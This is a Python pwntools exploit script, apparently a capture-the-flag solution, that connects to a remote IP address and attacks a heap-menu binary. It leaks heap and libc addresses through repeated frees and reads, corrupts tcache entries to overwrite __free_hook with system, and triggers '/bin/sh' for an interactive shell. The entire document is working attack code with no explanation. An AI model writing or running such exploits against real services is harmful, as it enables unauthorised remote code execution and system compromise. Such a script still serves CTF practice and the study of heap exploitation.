from pwn import *
#io = process("./pwn")
io = remote("52.152.231.198",8081)
context.log_level = 'debug'
libc = ELF("./bc.so.6")

def add(idx, size):
    io.sendlineafter(">>",str(1))
    io.sendlineafter("index",str(idx))
    io.sendlineafter("size",str(size))
def show(idx):
    io.sendlineafter(">>",str(4))
    io.sendlineafter("index\n",str(idx))
def edit(idx, content):
    io.sendlineafter(">>",str(3))
    io.sendlineafter("index",str(idx))
    io.sendafter("content",content)
def delete(idx):
    io.sendlineafter(">>",str(2))
    io.sendlineafter("index",str(idx))
def gift():
    io.sendlineafter(">>",str(5))
    io.sendafter("your name:\n",'aaa') 
def debug():
    print io.pid
    pause()
def exploit():
    add(0,0x30)
    add(1,0x30)
    add(2,0x40)
    add(3,0x50)
    for i in range(7):
        delete(0)
        edit(0,p64(0))
    show(0)
    s = io.recvline()
    s = s[:-1]
    s = s.ljust(8,chr(0))
    s = u64(s)
    print hex(s)
    heap = s - 0x260
    print hex(heap)
    delete(0)
    gift()
    show(0)
    s = io.recvline()
    s = s[:-1]
    s = s.ljust(8,chr(0))
    s = u64(s)
    print hex(s)
    libc.address = s - 0x3ebcd0
    print hex(libc.address)
    add(10,0x30) 
    add(11,0x30)
    edit(11, p64(0)*3 + p64(heap + 0x2e0)*2)
    edit(2, p64(0x51)+p64(libc.address + 0x3ebce0)*2) 
    delete(3)
    edit(3,p64(0))
    delete(3)
    add(4,0x48)
    freehook = libc.sym['__free_hook']
    edit(4,chr(0)*0x30+p64(0x61)+p64(freehook-8))
    add(5,0x50)
    add(6,0x50)
    system = libc.sym['system']
    edit(6,p64(system))
    edit(4,chr(0)*0x30+p64(0x61)+"/bin/sh\x00")
    delete(5)
    io.interactive()

exploit()
